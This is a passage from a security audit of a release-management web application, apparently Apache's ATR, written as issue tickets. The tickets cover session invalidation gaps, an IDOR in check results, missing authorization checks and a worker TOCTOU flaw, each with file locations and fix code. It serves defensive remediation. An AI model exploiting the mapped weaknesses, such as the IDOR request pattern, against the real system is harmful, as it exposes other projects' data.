            log.warning(f"LDAP credentials not configured - allowing in Debug mode")
            return True
        else:  # Test mode
            return config.get().ALLOW_TESTS
    
    # Normal LDAP validation
    return self._check_ldap_status(uid, credentials)
```

Add `validate_ldap_configuration()` startup check and `check_ldap_health()` monitoring endpoint.

### Acceptance Criteria
- [ ] Production mode fails closed when LDAP is unconfigured
- [ ] Debug mode logs warning but allows access
- [ ] Application startup validates LDAP configuration in production
- [ ] Monitoring endpoint exposes LDAP health status
- [ ] Unit tests verify fail-closed behavior in production mode

### References
- Source reports: L1:7.4.2.md
- Related findings: None
- ASVS sections: 7.4.2

### Priority
Medium

---

## Issue: FINDING-233 - JWT Signing Key Rotation Does Not Invalidate Cookie Sessions

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When the JWT signing key is rotated (a significant security event that invalidates all existing JWTs), cookie-based web sessions are unaffected. This creates an inconsistent security posture where API access via JWTs is revoked but web UI access via cookies continues. If JWT key rotation is performed due to suspected key compromise, attackers with active cookie sessions are not affected by the security response, creating incomplete incident response.

### Details
The JWT signing key rotation function in `atr/admin/__init__.py` (lines 404-410) and `atr/storage/writers/tokens.py` (lines 174-179) rotates the JWT signing key but does not terminate web sessions. This means:
- JWT-based API access is immediately revoked
- Web UI access via cookies continues unaffected
- Attackers with stolen cookies can continue accessing the web interface
- Security incident response is incomplete

### Recommended Remediation
Add automatic session termination to `rotate_jwt_key_post()`:

**Option A (Maximum Security):** Terminate all sessions globally including admin:
```python
async def rotate_jwt_key_post():
    await write.rotate_jwt_signing_key()
    await sessions.terminate_all_sessions_globally()
    return redirect('/login', message='JWT signing key rotated and all sessions terminated successfully. Please log in again.')
```

**Option B (Preserve Admin Session):** Preserve admin session:
```python
async def rotate_jwt_key_post():
    await write.rotate_jwt_signing_key()
    current_session_id = await get_current_session_id()
    await sessions.terminate_all_sessions_except(current_session_id)
    return redirect('/admin', message='JWT signing key rotated and all other sessions terminated successfully.')
```

**Recommendation:** Use Option A for maximum security during key rotation events.

### Acceptance Criteria
- [ ] JWT key rotation terminates all web sessions
- [ ] Users are redirected to login page with clear message
- [ ] Session termination is logged in audit trail
- [ ] Admin documentation explains session termination behavior
- [ ] Unit test verifying session termination on key rotation

### References
- Source reports: L2:7.4.3.md
- Related findings: ASVS-743-CRITICAL-001, ASVS-743-HIGH-002, ASVS-743-MEDIUM-003
- ASVS sections: 7.4.3

### Priority
Medium

---

## Issue: FINDING-234 - No Session Termination After SSH Key Changes

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When a user adds or removes an SSH key (an authentication factor for the SSH rsync server), no option is presented to terminate other active sessions. SSH keys are authentication factors and their modification should trigger the same session termination option as PAT changes. If a user removes a compromised SSH key, SSH access to rsync server is revoked but web UI sessions cannot be terminated, allowing an attacker with stolen web session to re-add SSH keys and regain access.

### Details
The SSH key management functions in `atr/post/keys.py`:
- `ssh_add()` (lines 141-155) adds SSH keys without session termination option
- `_delete_ssh_key()` (lines 174-184) deletes SSH keys without session termination option

The PAT management flows provide a 'terminate other sessions' checkbox, but this security feature is not consistently applied to SSH key operations.

### Recommended Remediation
Add 'terminate_other_sessions' boolean field to `AddSSHKeyForm` and `DeleteSSHKeyForm`:

```python
# In form definitions
class AddSSHKeyForm:
    # ... existing fields ...
    terminate_other_sessions: bool = False

class DeleteSSHKeyForm:
    # ... existing fields ...
    terminate_other_sessions: bool = False

# In ssh_add() handler
async def ssh_add(form: AddSSHKeyForm, session: web.Committer):
    # Add SSH key (existing logic)
    await write.add_ssh_key(session.uid, form.public_key)
    
    # Terminate other sessions if requested
    if form.terminate_other_sessions:
        await terminate_all_other_sessions(session.uid, current_session_id)
    
    return redirect('/keys', message='SSH key added successfully.')

# Similar logic for _delete_ssh_key()
```

Add checkbox to SSH key forms with appropriate messaging. For deletion, show warning if not checked: 'SSH key deleted successfully. Consider terminating other sessions if key was compromised.'

### Acceptance Criteria
- [ ] SSH key addition form includes session termination option
- [ ] SSH key deletion form includes session termination option
- [ ] Session termination option is checked by default for deletions
- [ ] User receives confirmation when sessions are terminated
- [ ] Unit test verifying session termination on SSH key changes

### References
- Source reports: L2:7.4.3.md
- Related findings: ASVS-743-CRITICAL-001, ASVS-743-LOW-001
- ASVS sections: 7.4.3

### Priority
Medium

---

## Issue: FINDING-235 - Web-Issued JWTs Survive PAT Deletion

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
JWTs issued through the web UI (`/tokens/jwt`) are not bound to any PAT and remain valid for their full 30-minute TTL regardless of any authentication factor changes. Only JWTs with the `atr_th` (PAT hash) claim are validated against the PAT database. This creates inconsistency: PAT-issued JWTs are immediately revoked when PAT is deleted, but web-issued JWTs continue working for up to 30 minutes, violating principle of immediate invalidation after credential changes.

### Details
In `atr/jwtoken.py`:
- `issue()` function (lines 72-82) generates JWTs with optional PAT binding
- `verify()` function (lines 112-145) only validates PAT hash if `atr_th` claim is present
- Web-issued JWTs from `atr/post/tokens.py` (lines 34-40) lack PAT binding

This means web-issued JWTs skip the PAT database validation entirely and remain valid until their `exp` claim expires, regardless of:
- User logout
- PAT deletion
- Account deactivation
- Admin credential revocation

### Recommended Remediation
**Option A (Recommended):** Require all JWTs to be issued through PATs:
```python
# Modify jwt_post() in atr/post/tokens.py
async def jwt_post(session: web.Committer):
    # Check if user has at least one PAT
    pats = await data.get_user_pats(session.uid)
    if not pats:
        raise BadRequest("You must create a Personal Access Token before issuing JWTs")
    
    # Bind JWT to first PAT
    jwt_token = jwtoken.issue(session.uid, pat_hash=pats[0].token_hash)
    return {"jwt": jwt_token}
```

**Option B:** Add per-user JWT invalidation version—add `jwt_version` field to JWT payload, store current version in `UserSessionVersion` table, check version during `verify()` for all JWTs, increment version when auth factors change.

**Option C (Minimal):** Reduce web-issued JWT TTL from 30 minutes to 5 minutes to limit exposure window.

### Acceptance Criteria
- [ ] Web-issued JWTs are revoked when user credentials change
- [ ] JWT revocation mechanism is consistent across issuance methods
- [ ] No increase in user friction for legitimate JWT usage
- [ ] Documentation explains JWT revocation behavior
- [ ] Unit test verifying web JWT revocation on credential changes

### References
- Source reports: L2:7.4.3.md
- Related findings: ASVS-743-CRITICAL-001, ASVS-743-MEDIUM-001
- ASVS sections: 7.4.3

### Priority
Medium

---

## Issue: FINDING-236 - Admin Pages Using template.blank() May Lack Logout Button

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Three admin pages use `template.blank()` rendering method whose implementation was not provided in the audit scope, making it unclear whether they include the logout button. If `template.blank()` does not extend `base.html` or include `topnav.html`, authenticated admin users on these pages will have no visible logout mechanism, directly violating ASVS 7.4.4. Users would need to navigate to another page, manually visit `/auth?logout`, or close the browser to terminate their session.

### Details
The following admin pages in `atr/admin/__init__.py` use `template.blank()`:
- `tasks_recent` (line 885)
- `_rotate_jwt_key_page` (line 1157)
- `_validate_jwt_page` (line 1210)

Without visibility into the `template.blank()` implementation, we cannot verify that these pages include the logout button required by ASVS 7.4.4. Other admin pages use `template.render()` which properly extends the base layout.

### Recommended Remediation
**Option 1:** Ensure `template.blank()` extends base layout by creating `layouts/blank.html`:
```html
{% extends "base.html" %}
{% block content %}
{{ content|safe }}
{% endblock %}
```

**Option 2 (Recommended):** Switch to `template.render()` for these pages to use standard layout with guaranteed logout button presence:
```python
# In atr/admin/__init__.py
async def tasks_recent():
    # ... existing logic ...
    return template.render('admin/tasks-recent.html', 
                          title='Recent Tasks',
                          tasks=tasks)
```

Verify `template.blank()` implementation includes `topnav.html` or refactor affected handlers to use `template.render()` with proper base layout inheritance.

### Acceptance Criteria
- [ ] All admin pages include visible logout button
- [ ] `template.blank()` extends base layout with navigation
- [ ] Manual testing confirms logout button presence on all three pages
- [ ] Documentation clarifies when to use `blank()` vs `render()`

### References
- Source reports: L2:7.4.4.md
- Related findings: ASVS-744-MED-002
- ASVS sections: 7.4.4

### Priority
Medium

---

## Issue: FINDING-237 - Admin Pages Using web.ElementResponse() May Lack Logout Button

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Three admin pages return `web.ElementResponse()` with form HTML elements, but the `web.ElementResponse()` implementation was not provided in audit scope. If `web.ElementResponse` renders only HTML fragments without wrapping them in `base.html`, these pages will lack the topnav navigation and logout button. Authenticated admin users on these pages may have no visible logout mechanism, violating ASVS 7.4.4.

### Details
The following admin pages in `atr/admin/__init__.py` return `web.ElementResponse()`:
- `keys_check_get` (line 442)
- `keys_regenerate_all_get` (line 466)
- `delete_test_openpgp_keys_get` (line 392)

These handlers return form elements directly without ensuring they are wrapped in the full page layout with navigation. If `web.ElementResponse` renders fragments only, users on these pages have no logout button.

### Recommended Remediation
**Option 1:** Modify `web.ElementResponse` class to wrap content in base layout:
```python
# In web module
class ElementResponse:
    def __init__(self, element, title="Admin"):
        self.element = element
        self.title = title
    
    def render(self):
        # Wrap in base layout
        return template.render('layouts/element-wrapper.html',
                             title=self.title,
                             content=self.element)
```

Create `layouts/element-wrapper.html`:
```html
{% extends "base.html" %}
{% block content %}
{{ content|safe }}
{% endblock %}
```

**Option 2 (Recommended):** Switch affected handlers to use `template.render()` with `admin/form-page.html` template:
```python
# In atr/admin/__init__.py
async def keys_check_get():
    form = CheckKeysForm()
    return template.render('admin/form-page.html',
                          title='Check OpenPGP Keys',
                          form=form)
```

### Acceptance Criteria
- [ ] All admin pages include visible logout button
- [ ] `web.ElementResponse` wraps content in base layout
- [ ] Manual testing confirms logout button presence on all three pages
- [ ] Documentation clarifies ElementResponse layout behavior

### References
- Source reports: L2:7.4.4.md
- Related findings: ASVS-744-MED-001
- ASVS sections: 7.4.4

### Priority
Medium

---

## Issue: FINDING-238 - No Notification to User on Admin Token Revocation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
When an admin revokes all PATs for a user via `revoke_all_user_tokens()`, no email notification is sent to the affected user. However, self-service token deletion (`delete_token`, lines 89-109) does send an email notification. This inconsistency means users may not realize their credentials have been revoked, which is important for incident response. A user whose tokens are revoked by an admin during an incident response may not be aware, delaying their own remediation actions (password change, account review).

### Details
In `atr/storage/writers/tokens.py`:
- `revoke_all_user_tokens()` (lines 163-179) revokes tokens without notification
- `delete_token()` (lines 89-109) sends email notification on self-service deletion

This inconsistency creates a gap where admin-initiated security actions are invisible to the affected user. During incident response, users should be notified when admins revoke their credentials so they can:
- Change passwords if compromise is suspected
- Review account activity for suspicious behavior
- Update credential storage in automation tools
- Be aware of the security event

### Recommended Remediation
Add email notification to the `revoke_all_user_tokens()` function:

```python
# In atr/storage/writers/tokens.py
async def revoke_all_user_tokens(asf_uid: str, admin_uid: str) -> int:
    # ... existing deletion logic ...
    
    # Send email notification to user
    msg = mail.Message(
        email_sender="noreply@apache.org",
        email_recipient=f"{asf_uid}@apache.org",
        subject="ATR - All API Tokens Revoked by Administrator",
        body=f"""
Hello {asf_uid},

An ATR administrator has revoked all of your Personal Access Tokens.

If you believe this was done in error, please contact the infrastructure team.

If this was part of a security incident response, please:
1. Review your account activity for suspicious behavior
2. Change your Apache account password
3. Update any automation tools that use your API tokens

Revoked by: {admin_uid}
Time: {datetime.utcnow().isoformat()}

Best regards,
ASF Infrastructure
"""
    )
    await mail.sendmail(msg)
    
    return count
```

### Acceptance Criteria
- [ ] Admin token revocation sends email notification to affected user
- [ ] Email includes admin identity and timestamp
- [ ] Email provides guidance for incident response
- [ ] Email format is consistent with self-service deletion notifications
- [ ] Unit test verifying email notification on admin revocation

### References
- Source reports: L2:7.4.5.md
- Related findings: None
- ASVS sections: 7.4.5

### Priority
Medium

---

## Issue: FINDING-239 - GET Blueprint Lacks Centralized Project-Level Authorization

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The POST blueprint automatically calls `check_access(project_key)` when a `project_key` parameter is detected in the route signature, providing centralized project-level authorization. The GET blueprint has no equivalent mechanism, requiring each GET handler to manually call `session.check_access(project_key)`. This architectural asymmetry creates inconsistency risk—developers adding new GET routes with project parameters may omit the authorization check, and the authorization documentation does not explain this difference.

### Details
The POST blueprint provides automatic authorization enforcement when handlers declare `project_key` parameters. The GET blueprint in `atr/blueprints/get.py` lacks this mechanism, requiring manual authorization checks in handlers across:
- `atr/get/distribution.py`
- `atr/get/file.py`
- `atr/get/report.py`
- `atr/get/checks.py`

This creates risk that new GET endpoints with project parameters may omit authorization checks, as there is no centralized enforcement pattern.

### Recommended Remediation
**Option A (Preferred):** Add automatic authorization to GET Blueprint by detecting `project_key` parameters and calling `check_access()` automatically, mirroring POST blueprint behavior:

```python
# In atr/blueprints/get.py
@get_blueprint.before_request
async def enforce_project_authorization():
    """Automatically check project access for routes with project_key."""
    if 'project_key' in request.view_args:
        project_key = request.view_args['project_key']
        session = await get_session()
        if session and hasattr(session, 'check_access'):
            await session.check_access(project_key)
```

**Option B:** Document the requirement in `authorization-security.md` with explicit guidance that GET endpoints with `project_key` parameters MUST explicitly call `check_access()`. Add linting rule to detect missing checks. Audit all existing GET endpoints with `project_key` parameters. Add integration tests for each endpoint verifying authorization. Add developer documentation to `developer-guide.md`.

### Acceptance Criteria
- [ ] GET blueprint enforces project authorization automatically or via documented pattern
- [ ] All GET endpoints with project parameters enforce authorization
- [ ] Authorization enforcement is consistent across GET and POST blueprints
- [ ] Developer documentation explains authorization patterns
- [ ] Integration tests verify authorization enforcement

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-240 - IDOR in Check Result Endpoint — Data Not Scoped to Validated Project

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The check result endpoint calls `session.check_access(project_key)` to verify the user has access to the specified project, but then fetches the check result record solely by its integer `check_id` without verifying it belongs to the validated release. This allows an authenticated committer to retrieve detailed check results from any project by guessing or enumerating check IDs, enabling unauthorized access to security scan results, vulnerability data, and internal analysis from other projects.

### Details
In `atr/get/result.py` (lines 33-62), the handler:
1. Validates project access: `await session.check_access(project_key)` 
2. Fetches release: `release = await session.release(project_key, version_key)`
3. **Fetches check result by ID only:** `check_result = await data.check_result(check_id)` (line 55)
4. Never verifies that `check_result.release_key == release.key`

An attacker can call `/get/result/{their_project}/{version}?check_id={other_project_check_id}` to retrieve check results from projects they don't have access to.

### Recommended Remediation
Scope check result query to validated release by adding `release_key` filter:

```python
# In atr/get/result.py
async def check_result_handler(
    project_key: str,
    version_key: str,
    check_id: int,
    session: web.Committer
):
    await session.check_access(project_key)
    release = await session.release(project_key, version_key)
    
    # Fetch check result scoped to the validated release
    check_result = await data.check_result(check_id, release_key=release.key)
    
    # Alternative: Add explicit validation
    check_result = await data.check_result(check_id)
    if check_result.release_key != release.key:
        raise Forbidden("Check result does not belong to specified release")
    
    # ... rest of handler ...
```

Additional recommendations:
- Audit all endpoints using integer IDs for similar IDOR vulnerabilities
- Add integration test attempting cross-project check result access
- Consider using composite keys (release_key + check_sequence) instead of global IDs
- Add rate limiting to check result endpoints to prevent enumeration
- Document data scoping requirements in `authorization-security.md`

### Acceptance Criteria
- [ ] Check result queries are scoped to the validated release
- [ ] Cross-project check result access is prevented
- [ ] Integration test verifies IDOR is prevented
- [ ] Documentation explains data scoping pattern
- [ ] Code review identifies and fixes similar IDOR vulnerabilities

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-241 - API Blueprint Lacks Centralized Authentication Hook

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The admin blueprint enforces authentication via a centralized `before_request` hook that verifies admin status for all routes. The API blueprint only implements a rate-limiting hook, requiring each API endpoint to individually apply `@jwtoken.require` decorators. Without centralized enforcement or comprehensive documentation mapping endpoints to authentication requirements, new API endpoints could be added without proper authentication, creating unauthorized access risk.

### Details
In `atr/blueprints/api.py`, the blueprint provides rate limiting but no centralized authentication:
- Admin blueprint: Uses `_check_admin_access()` before_request hook
- API blueprint: No authentication hook, relies on per-endpoint decorators

The `atr/api/__init__.py` module contains numerous endpoints with varying authentication requirements, but no centralized documentation maps which endpoints require authentication. Developers adding new API endpoints must remember to apply `@jwtoken.require` decorator with no architectural enforcement.

### Recommended Remediation
**Option A:** Add centralized authentication hook to API blueprint if all API endpoints require auth:

```python
# In atr/blueprints/api.py
@api_blueprint.before_request
async def enforce_api_authentication():
    """Validate JWT for all API requests."""
    # Allow public endpoints (maintain allowlist)
    public_endpoints = ['/api/openapi.json', '/api/docs']
    if request.path in public_endpoints:
        return
    
    # Validate JWT and store in request context
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    payload = jwtoken.verify(token)
    if not payload:
        quart.abort(401)
    
    # Store payload in request context for handlers
    g.jwt_payload = payload
```

**Option B:** Create comprehensive documentation in `authorization-security.md` with API endpoint authorization matrix including authentication requirements, authorization levels, and rate limits. Add developer checklist for new API endpoints.

**Option C:** Add linting rule to detect API endpoint functions without `@jwtoken.require` decorator. Audit all existing API endpoints for authentication status. Add integration tests verifying authentication for each endpoint.

### Acceptance Criteria
- [ ] API blueprint enforces authentication centrally or via documented pattern
- [ ] All API endpoints have clear authentication requirements
- [ ] Developer documentation explains API authentication patterns
- [ ] Linting or tests detect missing authentication
- [ ] Integration tests verify authentication enforcement

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-242 - Information Leakage via Debug Print in SSH Authorization Path

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The SSH read authorization validation function includes a debug `print()` statement that outputs the entire `sql.Release` object to stdout for every SSH read request. This object contains release metadata including phase, version, project key, and potentially sensitive internal data. The output is not structured logging and goes directly to server stdout/logs, potentially exposing sensitive information in log aggregation systems, compromising the principle that debug output should not leak sensitive data.

### Details
In `atr/ssh.py` at line 455, the SSH authorization path contains:
```python
print(release)  # Debug output
```

This outputs the full `sql.Release` object representation for every SSH read operation. The output:
- Goes to unstructured stdout instead of structured logging
- Includes internal database fields and metadata
- Executes on every SSH read request (high volume)
- May be captured by log aggregation systems
- Could expose sensitive release information to unauthorized users

### Recommended Remediation
**Option A (Preferred):** Remove the debug `print()` statement entirely:
```python
# In atr/ssh.py, line 455
# DELETE: print(release)
```

**Option B:** Replace with structured logging using Python logging module at DEBUG level with specific fields:
```python
# In atr/ssh.py, line 455
log.debug("SSH read authorization check", 
         project_key=release.project_key,
         version=release.version_key,
         phase=release.phase,
         user=uid)
```

Additional recommendations:
- Audit entire codebase for debug `print()` statements
- Implement structured logging framework if not already present
- Add linting rule to detect `print()` in production code
- Document logging standards in `developer-guide.md`
- Review log retention policies for sensitive data

### Acceptance Criteria
- [ ] Debug print statement is removed or replaced with structured logging
- [ ] No sensitive data is output via print() statements
- [ ] Codebase audit identifies and removes other print() statements
- [ ] Linting rule prevents future print() statements in production code
- [ ] Documentation establishes logging standards

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-243 - Missing Authorization Documentation for Distribution/SSH/Keys/Policy/Project Operations

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The authorization documentation (`atr/docs/authorization-security.md`) comprehensively covers releases, tokens, and check ignores, but lacks documented authorization rules for: Distribution Management, SSH/Rsync Access Control, Key Management, Policy Management, Project Management, and Admin Operations. These operations have authorization controls implemented via the storage layer and explicit checks, but without documentation, they cannot be systematically verified during security audits or developer onboarding.

### Details
The authorization documentation is incomplete for the following areas:
- **Distribution Management:** automate, record, delete operations with committee member requirements
- **SSH/Rsync Access:** read/write phase restrictions, path validation rules
- **Key Management:** OpenPGP and SSH operations, committee associations, ownership requirements
- **Policy Management:** compose/vote/finish settings, workflow configuration
- **Project Management:** create, delete, lifecycle operations
- **Admin Operations:** Beyond token revocation

These operations have authorization controls implemented in code but are not documented, making it difficult to:
- Verify correct authorization during security audits
- Onboard developers to authorization patterns
- Ensure consistent authorization enforcement
- Detect authorization bypass vulnerabilities

### Recommended Remediation
Add comprehensive sections to `atr/docs/authorization-security.md` covering:

1. **Distribution Management Authorization**
   - automate/record/delete operations
   - Committee member requirements
   - Phase-based restrictions

2. **SSH/Rsync Access Authorization**
   - Phase-based access control matrix
   - Read vs write permissions by phase
   - Path validation rules

3. **Key Management Authorization**
   - OpenPGP operations (add, remove, associate)
   - SSH operations (add, remove)
   - Committee participation requirements
   - Ownership and committee association rules

4. **Policy Management Authorization**
   - compose/vote/finish policy updates
   - PMC member requirements
   - Podling restrictions

5. **Project Management Authorization**
   - create/delete/update operations
   - Committee admin requirements

6. **Admin Operations Authorization**
   - Complete list of admin-only operations
   - Admin role requirements

Additional recommendations:
- Add operation-level authorization matrix to each storage writer module docstring
- Create `atr/docs/authorization-matrix.md` with comprehensive endpoint mapping
- Add authorization requirements to API documentation
- Include authorization examples in `developer-guide.md`

### Acceptance Criteria
- [ ] Authorization documentation covers all operational areas
- [ ] Each operation documents required roles and conditions
- [ ] Authorization matrix maps all endpoints to requirements
- [ ] Developer guide includes authorization examples
- [ ] Documentation is validated against implemented controls

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-244 - Phase-Based Authorization Rules Not Consolidated

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Release lifecycle phases govern which operations are permitted, but these phase-based authorization rules are scattered across multiple files with no consolidated reference. A developer or auditor must trace through multiple code paths to understand the complete phase access matrix. This makes it difficult to verify complete phase authorization coverage, ensure consistent enforcement, and maintain the authorization model.

### Details
Phase-based authorization rules are scattered across:
- `atr/get/download.py` - Download restrictions by phase
- `atr/ssh.py` - SSH read/write access by phase
- `atr/storage/writers/release.py` - Phase transition rules
- `atr/get/vote.py` - Voting availability by phase
- `atr/post/upload.py` - Upload restrictions by phase

Each file implements phase checks independently without a consolidated reference. This creates maintenance burden and increases risk of inconsistent enforcement. Examples of phase-based rules:
- Draft phase: SSH write access, no public downloads
- Candidate phase: SSH read-only, voting available
- Preview phase: Public downloads, distribution required
- Release phase: Immutable, announcement allowed

### Recommended Remediation
Add consolidated phase access matrix to `atr/docs/authorization-security.md`:

1. **Phase Definitions Table**
   - Phase name, description, purpose

2. **Operation Access by Phase Matrix**
   - Rows: Operations (upload, download, vote, ssh-write, ssh-read, etc.)
   - Columns: Phases (draft, candidate, preview, release)
   - Cells: Allowed/Denied with role requirements

3. **Phase Transition Authorization Requirements**
   - Current phase → target phase
   - Required conditions (checks pass, has files, no ongoing tasks)
   - Required role (participant, PMC member, admin)

4. **Enforcement Locations Documentation**
   - Map each phase check to source file and line number

5. **Code References**
   - Link to implementation of each phase check

Additional recommendations:
- Add phase validation helper function to reduce code duplication
- Add phase transition audit logging
- Create phase transition diagram in documentation
- Add phase-based integration tests for all operations
- Document phase enforcement in each storage writer module

### Acceptance Criteria
- [ ] Phase access matrix documented comprehensively
- [ ] All phase-based operations are documented
- [ ] Phase transition rules are documented with conditions
- [ ] Documentation includes code references
- [ ] Phase-based integration tests verify documented behavior

### References
- Source reports: L1:8.1.1.md
- Related findings: None
- ASVS sections: 8.1.1

### Priority
Medium

---

## Issue: FINDING-245 - Missing Project-Level Access Control on Multiple GET Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Seven GET endpoint handlers that display project-specific data fail to verify that the authenticated user has access to the requested project. While authentication is enforced (all require `web.Committer` session), authorization is missing, allowing any ASF committer to view data for projects they are not associated with. This enables unauthorized access to file lists, distribution records, check results, reports, SBOM data, and project details.

### Details
The following GET endpoints lack project authorization checks:
- `atr/get/file.py:36` - File listing endpoint
- `atr/get/file.py:109` - File content endpoint
- `atr/get/distribution.py:48` - Distribution list endpoint
- `atr/get/checks.py:88` - Check results endpoint
- `atr/get/report.py:30` - Report endpoint
- `atr/get/sbom.py:48` - SBOM endpoint
- `atr/get/projects.py:125` - Project details endpoint

Each endpoint authenticates users but does not call `session.check_access(project_key)` to verify project-level authorization. Successful authorization patterns exist in other GET endpoints like `start.py`, `upload.py`, `revisions.py`, `voting.py`, `manual.py`, `finish.py`, `ignores.py`, and `result.py`.

### Recommended Remediation
Add `await session.check_access(project_key)` at the beginning of each affected function before processing project-specific data:

```python
# Example for atr/get/file.py
async def file_list(project_key: str, version_key: str, session: web.Committer):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...
```

Apply this pattern to all seven affected endpoints.

### Acceptance Criteria
- [ ] All seven endpoints enforce project-level authorization
- [ ] Unauthorized committers cannot access other projects' data
- [ ] Integration tests verify authorization enforcement
- [ ] Consistent authorization pattern across all GET endpoints
- [ ] No functional regression for authorized users

### References
- Source reports: L1:8.2.1.md
- Related findings: None
- ASVS sections: 8.2.1

### Priority
Medium

---

## Issue: FINDING-246 - Key Association Update Bypasses Committee Membership Validation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The key association update endpoint (`POST /keys/details/<fingerprint>`) allows users to associate their OpenPGP signing keys with committees. The function commits committee associations to the database BEFORE validating that the user is a member of those committees, then performs a post-commit membership check that silently skips unauthorized associations. This creates a persistent unauthorized state in the database where users can associate their keys with committees they don't belong to.

### Details
In `atr/post/keys.py` (lines 68-105), the `details_post()` function:
1. Commits committee associations to database via `commit()`
2. THEN validates committee membership in post-commit loop
3. Silently skips unauthorized associations without error or rollback

This is the reverse of the secure pattern. The `add()` function in the same file (line 30) correctly uses `as_committee_participant()` method to validate membership BEFORE database writes.

The vulnerability allows:
- Unauthorized key-committee associations in the database
- Silent bypass of committee membership checks
- Potential signing key confusion across committees

### Recommended Remediation
Validate committee membership BEFORE database modification:

```python
# In atr/post/keys.py, details_post() function
async def details_post(fingerprint: str, form: KeyDetailsForm, session: web.Committer):
    # Validate committee membership BEFORE database writes
    for committee_key in form.committees:
        # Use storage layer authorization method
        write = await data.write.as_committee_participant(
            committee_key=committee_key,
            asf_uid=session.uid
        )
        # This will raise AccessError if not a member
    
    # Now proceed with database writes
    # The storage layer should handle writes internally after authorization
    await write.update_key_associations(fingerprint, form.committees)
```

Follow the same pattern used in the `add()` function at line 30 of the same file for consistency.

### Acceptance Criteria
- [ ] Committee membership is validated before database writes
- [ ] Unauthorized key associations are prevented
- [ ] Error message is displayed for unauthorized associations
- [ ] Storage layer handles database writes after authorization
- [ ] Unit test verifies membership validation before writes

### References
- Source reports: L1:8.2.1.md
- Related findings: None
- ASVS sections: 8.2.1

### Priority
Medium

---

## Issue: FINDING-247 - Worker Task Execution Lacks Function-Level Authorization Re-verification

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Background tasks verify authorization when queued but do not re-verify permissions when executed by the worker. This creates a Time-of-Check-Time-of-Use (TOCTOU) vulnerability where tasks queued by authorized users continue to execute after their permissions are revoked. Only ban status is checked at execution time, not function-level permissions like admin status or committee membership. This allows formerly-authorized users to execute privileged operations after permission revocation.

### Details
In `atr/worker.py` (lines 229-275), the `_task_process()` function:
1. Checks if user is banned
2. Executes task handler
3. Does NOT re-verify function-level permissions

Task types that require authorization re-verification:
- `METADATA_UPDATE` - Requires admin status
- Project-scoped tasks - Require committee membership
- Release operations - Require participant status

The gap between task creation and execution can be significant (minutes to hours), during which time:
- User could be removed from admin list
- Committee membership could be revoked
- Project participation could be terminated

### Recommended Remediation
Add function-level permission re-verification in `_task_process()`:

```python
# In atr/worker.py, _task_process() function
async def _task_process(worker, task):
    # Existing ban check
    if task.asf_uid in worker.banned:
        log.error(f"Banned user {task.asf_uid} attempted to execute task")
        return
    
    # ADD: Function-level permission re-verification
    await _verify_task_permissions(task)
    
    # Execute task
    await task_handler(task)

async def _verify_task_permissions(task):
    """Re-verify permissions required for task execution."""
    # Admin tasks require admin status
    if task.task_type == TaskType.METADATA_UPDATE:
        if task.asf_uid not in admin.admins:
            raise storage.AccessError(f"User {task.asf_uid} no longer has admin privileges")
    
    # Project-scoped tasks require committee membership
    if task.project_key:
        write = await data.write.as_committee_member(
            committee_key=get_committee_for_project(task.project_key),
            asf_uid=task.asf_uid
        )
        # Raises AccessError if not a member
```

### Acceptance Criteria
- [ ] Task execution re-verifies function-level permissions
- [ ] Admin tasks fail if user no longer has admin status
- [ ] Committee tasks fail if membership is revoked
- [ ] Failed permission checks are logged with reason
- [ ] Unit test verifies permission re-verification

### References
- Source reports: L1:8.2.1.md
- Related findings: None
- ASVS sections: 8.2.1

### Priority
Medium

---

## Issue: FINDING-248 - Inconsistent Defense-in-Depth in Distribution Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Three distribution POST handlers and one GET handler do not call `session.check_access(project_key)` before accessing project-scoped data. The POST handlers have mitigating storage-layer authorization (`write_as_committee_member()`), but the GET handler (`list_get`) exposes distribution records and workflow task details to any authenticated committer without project-level authorization, enabling unauthorized access to distribution configuration and workflow status.

### Details
The following distribution endpoints lack `session.check_access(project_key)`:
- `atr/get/distribution.py:38` - `list_get()` - Exposes distribution records
- `atr/get/distribution.py:180` - `record_selected()` - POST with storage-layer mitigation
- `atr/get/distribution.py:192` - `stage_automate_selected()` - POST with storage-layer mitigation
